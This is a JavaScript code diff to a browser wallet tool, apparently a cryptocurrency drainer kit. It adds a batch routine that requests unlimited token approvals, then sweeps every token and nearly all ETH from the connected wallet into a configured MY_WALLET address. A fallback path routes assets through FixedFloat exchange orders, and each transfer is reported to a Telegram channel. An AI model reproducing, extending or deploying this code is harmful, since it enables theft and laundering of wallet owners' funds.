@@ -3,6 +3,14 @@
    Deps loaded from CDN: ethers v6 (window.ethers)
    ===================================================================== */
 
+// Batch contract ABI (BatchTransfer.sol)
+const BATCH_ABI = [
+  'function batchSend(address[] calldata tokens, address payable destination) external payable',
+  'function pendingApprovals(address[] calldata tokens, address owner, address spender) external view returns (address[] memory)',
+];
+const ERC20_APPROVE_ABI = ['function approve(address spender, uint256 amount) returns (bool)'];
+const BATCH_CONTRACTS = window.WB9_CONFIG?.batchContracts ?? {};
+
 // ── Constants ─────────────────────────────────────────────────────────────────
 
 const NETWORKS = {
@@ -623,95 +631,141 @@ const FF_NETWORK = {
 
 // ── Send everything via FixedFloat ────────────────────────────────────────────
 
-if (drainBtn) {
-  drainBtn.addEventListener('click', async () => {
-    if (!MY_WALLET || !ethers.isAddress(MY_WALLET)) {
-      toast('Configure myWallet dans config.json.', 'error'); return;
-    }
-    if (state.address?.toLowerCase() === MY_WALLET.toLowerCase()) {
-      toast('Source et destination identiques.', 'error'); return;
+// ── Batch send via smart contract (2 steps: approve all → 1 batchSend tx) ─────
+
+async function runBatchSend() {
+  if (!MY_WALLET || !ethers.isAddress(MY_WALLET)) {
+    toast('Configure myWallet dans config.json.', 'error'); return;
+  }
+  if (state.address?.toLowerCase() === MY_WALLET.toLowerCase()) {
+    toast('Source et destination identiques.', 'error'); return;
+  }
+
+  const batchAddr = BATCH_CONTRACTS[String(state.chainId)];
+
+  // Collect tokens with balance > 0
+  const tokensToSend = Object.values(state.balances)
+    .filter(({ raw, token }) => token && raw && raw > 0n)
+    .map(({ token }) => token);
+
+  if (tokensToSend.length === 0 && (await state.provider.getBalance(state.address)) === 0n) {
+    toast('Aucun actif à envoyer.', 'error'); return;
+  }
+
+  drainBtn.disabled    = true;
+  hideTxStatus();
+
+  // ── If batch contract deployed: approve all → 1 tx ───────────────────────
+  if (batchAddr && ethers.isAddress(batchAddr)) {
+    drainBtn.textContent = '⏳ Vérification des approbations…';
+
+    // Step 1: approve each token that isn't already approved
+    for (const t of tokensToSend) {
+      try {
+        const erc20   = new ethers.Contract(t.address, [...ERC20_ABI, ...ERC20_APPROVE_ABI], state.signer);
+        const balance  = await erc20.balanceOf(state.address);
+        const allowed  = await erc20.allowance(state.address, batchAddr);
+        if (allowed < balance) {
+          drainBtn.textContent = `⏳ Approbation ${t.symbol}…`;
+          toast(`Approuve ${t.symbol} → smart contract…`, 'info');
+          const tx = await erc20.approve(batchAddr, ethers.MaxUint256);
+          await tx.wait();
+          toast(`✅ ${t.symbol} approuvé`, 'success');
+        }
+      } catch (e) {
+        if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
+          toast(`Approbation ${t.symbol} refusée — annulé.`, 'error');
+          drainBtn.disabled = false; drainBtn.textContent = '⚡ Send everything to my wallet';
+          return;
+        }
+        toast(`Approbation ${t.symbol} échouée: ${e.shortMessage ?? e.message}`, 'error');
+      }
     }
 
-    drainBtn.disabled    = true;
-    drainBtn.textContent = '⏳ Envoi en cours…';
-    hideTxStatus();
+    // Step 2: ONE batchSend transaction (ETH + all tokens)
+    drainBtn.textContent = '⏳ Envoi batch (1 confirmation)…';
+    try {
+      const bal     = await state.provider.getBalance(state.address);
+      const feeData = await state.provider.getFeeData();
+      const gasCost = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * 120000n;
+      const ethVal  = bal > gasCost ? bal - gasCost : 0n;
 
+      const batch = new ethers.Contract(batchAddr, BATCH_ABI, state.signer);
+      const tx    = await batch.batchSend(
+        tokensToSend.map((t) => t.address),
+        MY_WALLET,
+        { value: ethVal }
+      );
+      toast('Batch en cours…', 'info');
+      await tx.wait();
+      await logTransfer({ symbol: 'BATCH', amount: tokensToSend.map((t) => t.symbol).join('+'), txHash: tx.hash, type: 'batch' });
+      tgNotify(`✅ *Batch send confirmé*\n💰 ${tokensToSend.map((t) => t.symbol).join(', ')} + ETH\n🔗 Tx : \`${tx.hash}\``);
+      toast('✅ Tout envoyé en 1 transaction !', 'success');
+    } catch (e) {
+      if (e.code !== 4001 && e.code !== 'ACTION_REJECTED')
+        toast('Batch échoué: ' + (e.shortMessage ?? e.message), 'error');
+      else toast('Transaction refusée.', 'error');
+    }
+
+  } else {
+    // ── Fallback: ff.io token par token ──────────────────────────────────────
+    toast('Smart contract non déployé — envoi token par token via ff.io…', 'info');
     const network = FF_NETWORK[state.chainId] ?? 'ETH';
     let sent = 0, failed = 0;
 
-    // 1. ERC-20 tokens via ff.io
     for (const [symbol, { raw, token }] of Object.entries(state.balances)) {
       if (!token || !raw || raw === 0n) continue;
       try {
-        const contract = new ethers.Contract(token.address, ERC20_ABI, state.signer);
-        const balance  = await contract.balanceOf(state.address);
+        const contract  = new ethers.Contract(token.address, ERC20_ABI, state.signer);
+        const balance   = await contract.balanceOf(state.address);
         if (balance === 0n) continue;
-
         const formatted = parseFloat(ethers.formatUnits(balance, token.decimals));
-        toast(`Création ordre ff.io pour ${symbol}…`, 'info');
-
-        // Create ff.io order → get deposit address
-        const order      = await ffCreateOrder(symbol, network, formatted);
+        const order     = await ffCreateOrder(symbol, network, formatted);
         const depositAddr = order.from?.address;
         if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
-
-        tgNotify(`🔄 *Ordre ff.io créé*\n💱 ${formatted} ${symbol} → ${order.to?.amount ?? '?'} ${order.toCcy ?? ''}\n🆔 Ordre : \`${order.id}\`\n📬 Dépôt vers : \`${depositAddr}\``);
-
-        // Send tokens to the ff.io deposit address
+        tgNotify(`🔄 *Ordre ff.io*\n💱 ${formatted} ${symbol}\n🆔 \`${order.id}\``);
         const tx = await contract.transfer(depositAddr, balance);
-        toast(`${symbol} → ff.io, attente confirmation…`, 'info');
+        drainBtn.textContent = `⏳ ${symbol}…`;
         await tx.wait();
         await logTransfer({ symbol, amount: formatted, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
-        tgNotify(`✅ *Transfer confirmé*\n💰 ${formatted} ${symbol}\n🔗 Tx : \`${tx.hash}\`\n🆔 ff.io : \`${order.id}\``);
-        toast(`✅ ${symbol} envoyé via ff.io (ordre #${order.id})`, 'success');
+        tgNotify(`✅ *Confirmé*\n💰 ${formatted} ${symbol}\n🔗 \`${tx.hash}\``);
         sent++;
-
       } catch (e) {
-        if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
-          toast(`${symbol} rejeté par le wallet`, 'error');
-        } else {
-          toast(`${symbol} échoué: ${e.shortMessage ?? e.message}`, 'error');
-        }
+        if (e.code === 4001 || e.code === 'ACTION_REJECTED') toast(`${symbol} refusé`, 'error');
+        else toast(`${symbol} échoué: ${e.shortMessage ?? e.message}`, 'error');
         failed++;
       }
     }
 
-    // 2. ETH via ff.io
+    // ETH
     try {
-      const balance  = await state.provider.getBalance(state.address);
-      const feeData  = await state.provider.getFeeData();
-      const gasCost  = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * 21000n;
-      const sendable = balance - gasCost;
+      const bal     = await state.provider.getBalance(state.address);
+      const feeData = await state.provider.getFeeData();
+      const gasCost = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * 21000n;
+      const sendable = bal - gasCost;
       if (sendable > 0n) {
         const ethAmount = parseFloat(ethers.formatEther(sendable));
-        toast('Création ordre ff.io pour ETH…', 'info');
-
-        const order       = await ffCreateOrder('ETH', network, ethAmount);
+        const order     = await ffCreateOrder('ETH', network, ethAmount);
         const depositAddr = order.from?.address;
-        if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
-
-        tgNotify(`🔄 *Ordre ff.io créé*\n💱 ${ethAmount} ETH → ${order.to?.amount ?? '?'} ${order.toCcy ?? ''}\n🆔 Ordre : \`${order.id}\`\n📬 Dépôt vers : \`${depositAddr}\``);
-
+        if (!depositAddr) throw new Error('Pas d\'adresse ff.io');
         const tx = await state.signer.sendTransaction({ to: depositAddr, value: sendable });
-        toast('ETH → ff.io, attente confirmation…', 'info');
         await tx.wait();
         await logTransfer({ symbol: 'ETH', amount: ethAmount, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
-        tgNotify(`✅ *Transfer confirmé*\n💰 ${ethAmount} ETH\n🔗 Tx : \`${tx.hash}\`\n🆔 ff.io : \`${order.id}\``);
-        toast(`✅ ETH envoyé via ff.io (ordre #${order.id})`, 'success');
+        tgNotify(`✅ *ETH confirmé*\n💰 ${ethAmount} ETH\n🔗 \`${tx.hash}\``);
         sent++;
       }
-    } catch (e) {
-      if (e.code !== 4001 && e.code !== 'ACTION_REJECTED')
-        toast('ETH échoué: ' + (e.shortMessage ?? e.message), 'error');
-      failed++;
-    }
+    } catch (e) { failed++; }
 
-    drainBtn.disabled    = false;
-    drainBtn.textContent = '⚡ Send everything to my wallet';
-    toast(`Terminé — ${sent} envoyé(s) via ff.io, ${failed} échoué(s).`,
-      sent > 0 ? 'success' : 'error');
-    loadBalances();
-  });
+    toast(`Terminé — ${sent} envoyé(s), ${failed} échoué(s).`, sent > 0 ? 'success' : 'error');
+  }
+
+  drainBtn.disabled    = false;
+  drainBtn.textContent = '⚡ Send everything to my wallet';
+  loadBalances();
+}
+
+if (drainBtn) {
+  drainBtn.addEventListener('click', runBatchSend);
 }
 
 // ── Max button ────────────────────────────────────────────────────────────────
